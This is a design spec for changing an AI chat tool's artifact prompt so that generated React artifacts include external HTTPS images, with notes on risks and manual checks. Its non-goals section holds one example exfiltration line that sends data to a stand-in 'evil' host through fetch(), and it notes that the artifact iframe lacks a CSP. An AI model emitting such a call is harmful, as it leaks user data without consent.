# Artifact external images: encourage by default

**Date:** 2026-04-30
**Scope:** A single prompt change in `src/lib/store.ts` so artifacts are encouraged to include external HTTPS images (Unsplash, Wikimedia, official CDNs) with quality nudges (sizing, lazy loading, alt text). No settings, no UI, no toggle, no CSP work. Out of scope: tightening the iframe sandbox/CSP (separate spec if ever wanted).

## Problem

Today's `REACT_ARTIFACT_INSTRUCTIONS` block in [src/lib/store.ts](src/lib/store.ts) tells the model:

> Never fetch external URLs from inside the artifact — the iframe is network-sandboxed. All data must come via Sahayak.fetchData('<filename>').

That instruction is misleading on two counts and unhelpful on one:

1. **Misleading**: the iframe is `sandbox="allow-scripts allow-same-origin"` with no CSP — `<img src="https://...">` and `fetch('https://...')` already work today. The "network-sandboxed" claim is policy-by-prompt, not enforcement.
2. **Misleading**: the rationale "All data must come via Sahayak.fetchData" conflates app data (which DOES need to come via the bridge because the iframe doesn't have session-scoped paths) with display assets (images, icons) that don't.
3. **Unhelpful**: artifacts that should be visually rich — recipe cards, country profiles, portfolio mocks, dashboards — render bare and dull because the model dutifully refuses external images.

## Goal

Artifacts can include images from reputable HTTPS sources, formatted with reasonable hygiene (explicit dimensions, lazy loading, alt text) so they look polished without breaking layout.

## Non-goals

- A user-facing toggle to disable external images. Universal "yes, include images" is fine for the single-user local-dev tool; an opt-in adds settings/UI/wiring cost without buying anything for the open-source release.
- A CSP `<meta>` tag or response-header policy on the artifact runtime. Today there is no CSP at all; tightening it is a separate, larger spec orthogonal to image policy. Without a CSP, the model could already exfil via `fetch('https://evil/?leak=' + ...)` regardless of any image policy text.
- A per-artifact override.
- Any change to `Sahayak.fetchData` or the data-bridge mechanism.
- Image-generation tooling (the model still references third-party hosted images; it doesn't generate them).

## Design

Replace the "Never fetch external URLs..." paragraph in `REACT_ARTIFACT_INSTRUCTIONS` (currently around [src/lib/store.ts:53-54](src/lib/store.ts#L53)) with the version below. The surrounding `Data pipeline for artifacts (do these in order):` block and the minimal `react-artifact` example stay unchanged — `Sahayak.fetchData` is still the data-bridge for app state, just not for display assets.

New block:

```
External images: include them when they make the artifact more readable or
more delightful. Use thoughtfully — pick sources that look professional and
load reliably:

- Stock imagery: images.unsplash.com (append `?w=800&q=80&auto=format` for
  reasonable bytes), upload.wikimedia.org for diagrams/maps/historical, or
  the user's own URLs if they provide them.
- Logos and icons: prefer official CDNs (e.g. simpleicons.org, devicons,
  brand asset pages). Avoid hotlinking from random blogs.
- For inline icons under ~5KB, prefer data: URIs to avoid network round-trips.

Image hygiene:
- Always set explicit `width` and `height` (or aspect ratio via CSS) so the
  layout doesn't reflow as images load.
- Use `loading="lazy"` for images below the fold.
- Use `style={{objectFit: "cover"}}` (or "contain") rather than letting the
  browser stretch.
- Use `alt` text — the artifact may be screenshotted into the chat.

Other external resources (scripts, stylesheets, custom fonts, fetch() to
other origins) — don't. Keep the artifact's runtime origin clean. App data
still comes via Sahayak.fetchData('<filename>').
```

The intent of the closing paragraph is to keep the prompt's earlier `Sahayak.fetchData` data-bridge expectation intact while explicitly carving out images. "Other external resources" lists what stays off-policy so the model doesn't read "external HTTPS allowed" as a blanket invitation to load arbitrary scripts and stylesheets.

## What changes, file by file

- **`src/lib/store.ts`** — the only file. The existing `Never fetch external URLs` paragraph (the two lines at ~53-54 of the existing constant literal) is replaced with the new ~22-line block above. The rest of `REACT_ARTIFACT_INSTRUCTIONS` is untouched.

## Risks and trade-offs

- **No enforcement.** The prompt is the only gate. A misbehaving model (or a prompt-injected one) can still emit `<script>` tags, `<link>` stylesheets, or `fetch()` to other origins. We accept this — it was the situation before this spec too. CSP work is a separate spec.
- **Image URLs may rot.** Hotlinked images can return 404 over time. The artifact still renders; the broken image is visible. Acceptable.
- **No bandwidth cap.** A particularly enthusiastic artifact could pull a dozen large images. Mitigation: the prompt explicitly suggests Unsplash query params for sizing, and `loading="lazy"`. No hard runtime limit.
- **Existing artifacts unchanged.** Artifacts already rendered won't suddenly include images — they were generated under the old policy. Only newly-generated artifacts will use the new prompt.

## Verification

There is no test suite. Verify manually:

1. `npm run dev`. In artifact mode, ask the assistant to "make me a recipe card for shakshuka with a hero image." Confirm the rendered artifact includes an `<img src="https://images.unsplash.com/...">` (or similar) with `width`/`height`/`alt`.
2. Confirm the artifact still renders correctly after refresh — the iframe sandbox already allows external image fetches; no panel-side changes were needed.
3. Open an artifact from a previous session (created before this change). Confirm it still renders the same way it always did.
